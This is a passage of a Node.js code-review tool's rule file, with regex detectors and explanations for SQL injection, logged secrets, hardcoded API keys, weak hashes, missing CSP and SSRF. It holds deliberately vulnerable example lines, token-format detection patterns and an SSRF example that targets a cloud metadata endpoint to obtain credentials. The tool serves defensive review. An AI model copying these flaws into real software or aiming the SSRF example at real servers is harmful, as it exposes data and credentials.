            findings.push({ severity, category: 'helmet_missing', file: path, line: i + 1, message: 'Express app without Helmet — missing security headers.', suggestion: "npm install helmet && add app.use(helmet()) immediately after const app = express()." });
            break;
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_019',
    category: 'sql_injection',
    description: 'String-concatenated SQL queries with user input are vulnerable to SQL injection.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'sql-injection'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'SQL injection is the #1 web vulnerability. Interpolating user input into SQL allows attackers to drop tables, exfiltrate data, or bypass authentication. Always use parameterized queries or an ORM.',
      commonViolations: ['db.query(`SELECT * FROM users WHERE id = ${req.params.id}`)', "query(\"WHERE email = '\" + email + \"'\")"],
      goodExample: "db.query('SELECT * FROM users WHERE id = $1', [req.params.id])",
      badExample: "`SELECT * FROM users WHERE email = '${email}'`  // classic SQL injection",
      relatedPlaybooks: ['database-security.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('sql_injection', config.severityRules);
      const findings: Finding[] = [];
      const SQL_RE = /(?:SELECT|INSERT|UPDATE|DELETE|WHERE|FROM)\s[^`'"]*\$\{(?:req|body|params|query|input)\./i;
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path) && !SQL_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (SQL_RE.test(line)) {
            findings.push({ severity, category: 'sql_injection', file: path, line: i + 1, message: 'User input interpolated directly into SQL — SQL injection vulnerability.', suggestion: 'Use parameterized queries: db.query("SELECT ... WHERE id = $1", [id]).' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_020',
    category: 'sensitive_data_logged',
    description: 'Logging objects that may contain passwords, tokens, or keys ships secrets to log aggregators.',
    severity: 'HIGH',
    tags: ['node', 'security', 'logging'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Logging req.body, req.headers, or user objects dumps passwords, auth tokens, and API keys into log files and log aggregators (Datadog, Splunk). Use a dedicated redaction library or log only safe fields.',
      commonViolations: ['console.log(req.body)', 'logger.info(req.headers)', 'logger.debug(user)'],
      goodExample: 'logger.info({ userId: user.id, email: user.email }, "User logged in")  // structured, no secrets',
      badExample: 'console.log("login request:", req.body)  // { email, password: "hunter2" }',
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('sensitive_data_logged', config.severityRules);
      const findings: Finding[] = [];
      const LOG_RE = /(?:console\.|logger\.)(?:log|info|debug|warn|error)\s*\([^)]*(?:req\.body|req\.headers|password|token|secret|apiKey|authorization)/;
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (LOG_RE.test(line)) {
            findings.push({ severity, category: 'sensitive_data_logged', file: path, line: i + 1, message: 'Sensitive data (body/headers/token) passed to logger — may log secrets to aggregators.', suggestion: 'Log specific safe fields: logger.info({ userId, email }). Never log req.body or req.headers wholesale.' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_021',
    category: 'missing_cors_config',
    description: 'API without explicit CORS configuration defaults to allowing all origins in some frameworks.',
    severity: 'HIGH',
    tags: ['node', 'security', 'cors'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Some CORS packages default to allow all origins with credentials. An explicit allowlist prevents malicious websites from making credentialed cross-origin requests to your API.',
      commonViolations: ['app.use(cors())', 'cors() with no config'],
      goodExample: "app.use(cors({ origin: process.env.ALLOWED_ORIGINS?.split(',') ?? [], credentials: true }))",
      badExample: 'app.use(cors())  // may default to Allow-Origin: * — check package defaults',
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('missing_cors_config', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/app\.use\s*\(\s*cors\s*\(\s*\)/.test(line)) {
            findings.push({ severity, category: 'missing_cors_config', file: path, line: i + 1, message: 'cors() called with no configuration — defaults may allow all origins.', suggestion: "Configure explicit origins: cors({ origin: process.env.ALLOWED_ORIGINS?.split(',') })." });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_022',
    category: 'unhandled_promise_rejection',
    description: 'Promises without .catch() or try/catch in async functions cause unhandled rejection crashes in Node.js 15+.',
    severity: 'HIGH',
    tags: ['node', 'reliability', 'async'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Since Node.js 15, unhandled promise rejections crash the process with exit code 1. Even before that, they cause memory leaks. Attach .catch() to every independent promise chain.',
      commonViolations: ['someAsyncFn()', 'db.connect()  // not awaited and no catch'],
      goodExample: 'someAsyncFn().catch(err => logger.error(err));\n// Or: await someAsyncFn(); inside async function',
      badExample: 'cleanupOldSessions()  // fire-and-forget with no error handling — crashes on rejection',
      relatedPlaybooks: ['reliability.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('unhandled_promise_rejection', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/^\s+(?!await\s|return\s|const\s|let\s|var\s|\w+\s*=)\w+(?:Async)?\(/.test(line) && !line.includes('.catch(') && !line.includes('void ')) {
            const next2 = lines.slice(i + 1, Math.min(lines.length, i + 3)).join('\n');
            if (/^\s+\.catch\(/.test(next2) || /^\s+\)/.test(next2)) continue;
            if (/Promise\.|\.then\(|async\s+function/.test(content.slice(0, content.indexOf(line)))) {
              findings.push({ severity, category: 'unhandled_promise_rejection', file: path, line: i + 1, message: 'Async function called without await or .catch() — unhandled rejection may crash Node.js.', suggestion: 'Await the call, or chain .catch(err => logger.error(err)) to handle rejections.' });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_023',
    category: 'env_secret_hardcoded',
    description: 'Hardcoded API keys, tokens, or passwords in source files will be committed to git and leaked.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'secrets'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Secrets committed to git cannot be truly revoked — the git history persists forever. Rotate any secret the moment it is discovered in source code. Use environment variables and a secrets manager.',
      commonViolations: ["const API_KEY = 'sk-live-...'", "password: 'admin123'"],
      goodExample: "const API_KEY = process.env.API_KEY; // loaded from .env, never hardcoded",
      badExample: "const stripe = new Stripe('sk_live_abc123xyz...');  // leaked in git history forever",
      relatedPlaybooks: ['secrets-management.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('env_secret_hardcoded', config.severityRules);
      const findings: Finding[] = [];
      const SECRET_PATTERNS = [
        /(?:sk|pk)[-_](?:live|test)[-_][a-zA-Z0-9]{20,}/,  // Stripe-like
        /AIza[0-9A-Za-z-_]{35}/,                             // Google API key
        /AKIA[0-9A-Z]{16}/,                                  // AWS access key
        /ghp_[a-zA-Z0-9]{36}/,                               // GitHub PAT
        /xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}/,         // Slack bot token
        /(?:password|passwd|secret|apikey|api_key)\s*[:=]\s*['"][^'"]{8,}['"]/i,
      ];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path) && !path.endsWith('.json')) continue;
        if (path.includes('.env.example') || path.includes('test') || isTestPath(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (line.includes('process.env') || line.includes('env(') || line.includes('getenv')) continue;
          for (const re of SECRET_PATTERNS) {
            if (re.test(line)) {
              findings.push({ severity, category: 'env_secret_hardcoded', file: path, line: i + 1, message: 'Possible hardcoded secret detected — rotate immediately if real.', suggestion: 'Move to an environment variable. Add the key name to .env.example without the value.' });
              break;
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_024',
    category: 'deprecation_buffer_constructor',
    description: 'new Buffer() and Buffer() are deprecated — use Buffer.from(), Buffer.alloc(), or Buffer.allocUnsafe().',
    severity: 'MEDIUM',
    tags: ['node', 'reliability', 'deprecation'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'The deprecated Buffer() constructor is unsafe: new Buffer(number) creates an uninitialized buffer that may contain sensitive data. Buffer.alloc(n) zero-fills; Buffer.allocUnsafe(n) is fast but uninitialized (use only when writing immediately).',
      commonViolations: ['new Buffer(size)', 'Buffer(data)'],
      goodExample: 'Buffer.from(data, "utf8")\nBuffer.alloc(size)  // zero-filled\nBuffer.allocUnsafe(size)  // fast, write before reading',
      badExample: 'const buf = new Buffer(data);  // deprecated, potentially unsafe',
      relatedPlaybooks: ['node-migration.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('deprecation_buffer_constructor', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/new\s+Buffer\s*\(|(?<!\w)Buffer\s*\([^)]+\)/.test(line) && !line.includes('Buffer.from') && !line.includes('Buffer.alloc')) {
            findings.push({ severity, category: 'deprecation_buffer_constructor', file: path, line: i + 1, message: 'Deprecated Buffer() constructor — use Buffer.from(), Buffer.alloc(), or Buffer.allocUnsafe().', suggestion: 'Replace new Buffer(data) with Buffer.from(data, encoding) or Buffer.alloc(n).' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_025',
    category: 'circular_json_stringify',
    description: 'JSON.stringify() on objects with circular references throws a TypeError that crashes the process.',
    severity: 'MEDIUM',
    tags: ['node', 'reliability'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Error objects, Express request/response objects, and many framework objects have circular references. JSON.stringify(err) or JSON.stringify(req) throws "Converting circular structure to JSON".',
      commonViolations: ['JSON.stringify(err)', 'JSON.stringify(req)', 'JSON.stringify(res)'],
      goodExample: 'JSON.stringify(err, Object.getOwnPropertyNames(err))  // safe for Error objects',
      badExample: "res.json({ error: JSON.stringify(err) })  // TypeError: circular structure",
      relatedPlaybooks: ['error-handling.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('circular_json_stringify', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/JSON\.stringify\s*\(\s*(?:err|error|req|res|request|response)\b/.test(line)) {
            findings.push({ severity, category: 'circular_json_stringify', file: path, line: i + 1, message: 'JSON.stringify() on Error/request/response — circular structure causes TypeError.', suggestion: 'Use JSON.stringify(err, Object.getOwnPropertyNames(err)) for errors, or a logging library.' });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_026',
    category: 'missing_env_validation',
    description: 'Apps that start without validating required environment variables crash at runtime with confusing errors.',
    severity: 'MEDIUM',
    tags: ['node', 'reliability', 'dx'],
    sinceVersion: '3.0.0',
    explain: {
      why: "Without startup validation, a missing DATABASE_URL produces a connection error 200ms after startup, not an immediate clear \"DATABASE_URL is required\" message. Validate all env vars at startup and fail fast.",
      commonViolations: ['const db = new Client(process.env.DATABASE_URL)  // crashes when undefined'],
      goodExample: "// In env.ts:\nconst env = z.object({ DATABASE_URL: z.string().url() }).parse(process.env);\nexport default env;",
      badExample: "new PrismaClient()  // crashes if DATABASE_URL is undefined — confusing error",
      relatedPlaybooks: ['reliability.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('missing_env_validation', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!path.endsWith('env.ts') && !path.endsWith('env.js') && !path.includes('config')) return findings;
        if (!SOURCE_EXT.test(path)) continue;
        if (content.includes('process.env') && !content.includes('z.object') && !content.includes('z.string()') && !content.includes('validateEnv') && !content.includes('cleanEnv')) {
          findings.push({ severity, category: 'missing_env_validation', file: path, message: 'Environment config without Zod validation — missing vars cause confusing runtime errors.', suggestion: 'Use z.object({ DATABASE_URL: z.string().url() }).parse(process.env) to validate at startup.' });
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_027',
    category: 'missing_graceful_shutdown',
    description: 'HTTP servers without graceful shutdown handling drop in-flight requests on SIGTERM.',
    severity: 'MEDIUM',
    tags: ['node', 'reliability', 'deployment'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'Container orchestration (Kubernetes, Docker) sends SIGTERM before stopping a process. Without graceful shutdown, in-flight requests are dropped. Handle SIGTERM to stop accepting new connections, finish in-flight requests, then exit.',
      commonViolations: ['http.createServer(handler).listen(3000)  // no SIGTERM handler'],
      goodExample: "const server = app.listen(3000);\nprocess.on('SIGTERM', () => { server.close(() => { db.$disconnect(); process.exit(0); }); });",
      badExample: 'app.listen(3000)  // SIGTERM kills process mid-request',
      relatedPlaybooks: ['deployment.md'],
      relatedAgents: [],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('missing_graceful_shutdown', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        if (content.includes('SIGTERM') || content.includes('SIGINT')) return findings;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (/\.listen\s*\(\d+/.test(line) || /server\.listen\(/.test(line)) {
            findings.push({ severity, category: 'missing_graceful_shutdown', file: path, line: i + 1, message: 'Server start without SIGTERM/SIGINT handler — drops in-flight requests on deploy.', suggestion: "Add process.on('SIGTERM', () => server.close(() => process.exit(0))) after server.listen()." });
            break;
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_028',
    category: 'crypto_weak_algorithm',
    description: 'MD5 and SHA1 are cryptographically broken — never use them for security-sensitive purposes.',
    severity: 'HIGH',
    tags: ['node', 'security', 'crypto'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'MD5 is completely broken for collision resistance. SHA1 has practical collision attacks (SHAttered). For content hashing: SHA-256+. For password hashing: bcrypt/argon2/scrypt — never raw SHA of any kind.',
      commonViolations: ["crypto.createHash('md5')", "crypto.createHash('sha1')"],
      goodExample: "crypto.createHash('sha256').update(data).digest('hex')\n// For passwords: bcrypt.hash(password, 12)",
      badExample: "crypto.createHash('md5').update(password).digest('hex')  // rainbow tables trivially crack this",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('crypto_weak_algorithm', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (/createHash\s*\(\s*['"](?:md5|sha1|sha-1)['"]\s*\)/.test(line)) {
            findings.push({ severity, category: 'crypto_weak_algorithm', file: path, line: i + 1, message: 'MD5/SHA1 is cryptographically broken for security purposes.', suggestion: "Use SHA-256 or higher: createHash('sha256'). For passwords, use bcrypt or argon2." });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_029',
    category: 'missing_csp_header',
    description: 'Web applications without a Content-Security-Policy header are fully exposed to XSS attacks.',
    severity: 'HIGH',
    tags: ['node', 'security', 'http-headers', 'xss'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'CSP restricts which scripts, styles, and resources the browser may load. Without CSP, any injected script executes freely. A strict CSP is the last line of defense when XSS is injected.',
      commonViolations: ['app without Content-Security-Policy header', 'custom headers without CSP'],
      goodExample: "res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self'; object-src 'none'\");",
      badExample: "res.setHeader('X-Custom-Header', value)  // CSP not set — XSS executes freely",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('missing_csp_header', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        if (!content.includes('setHeader') && !content.includes('helmet')) return findings;
        if (content.includes('Content-Security-Policy') || content.includes('contentSecurityPolicy') || content.includes('helmet()')) return findings;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (/setHeader\s*\(/.test(line) && !line.includes('Content-Security-Policy')) {
            const file_content = content;
            if (!file_content.includes('Content-Security-Policy')) {
              findings.push({ severity, category: 'missing_csp_header', file: path, line: i + 1, message: 'Response headers set but Content-Security-Policy not included.', suggestion: "Add app.use(helmet()) or set Content-Security-Policy header manually with a strict policy." });
              break;
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'NODE_030',
    category: 'ssrf_unvalidated_url',
    description: 'Server-side requests to user-supplied URLs without validation allow SSRF attacks against internal infrastructure.',
    severity: 'BLOCKER',
    tags: ['node', 'security', 'ssrf'],
    sinceVersion: '3.0.0',
    explain: {
      why: 'SSRF (Server-Side Request Forgery) lets attackers route requests through your server to internal services — cloud metadata APIs (169.254.169.254), databases, or private services that are otherwise firewalled.',
      commonViolations: ['fetch(req.body.url)', 'axios.get(req.query.webhook)', 'http.get(input.endpoint)'],
      goodExample: "const url = new URL(input.url);\nif (!['https:'].includes(url.protocol) || isPrivateIp(url.hostname)) throw new Error('Invalid URL');\nawait fetch(url.toString());",
      badExample: "await fetch(req.body.webhookUrl)  // http://169.254.169.254/latest/meta-data/ gets AWS credentials",
      relatedPlaybooks: ['security-node.md'],
      relatedAgents: ['security-reviewer'],
      relatedSkills: [],
    },
    detect({ config, changedFiles = [] }: DetectInput): Finding[] {
      const severity = classifySeverity('ssrf_unvalidated_url', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!SOURCE_EXT.test(path)) continue;
        const SSRF_RE = /(?:fetch|axios\.get|axios\.post|http\.get|https\.get|got)\s*\(\s*(?:req\.|body\.|params\.|query\.|input\.)\w+/;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (isCommentLine(line)) continue;
          if (SSRF_RE.test(line)) {
            findings.push({ severity, category: 'ssrf_unvalidated_url', file: path, line: i + 1, message: 'Server-side request to user-supplied URL without validation — SSRF attack vector.', suggestion: 'Validate the URL: enforce https:// protocol, block private IP ranges (10.x, 192.168.x, 169.254.x, ::1).' });
          }
        }
      }
      return findings;
    },
  },
];
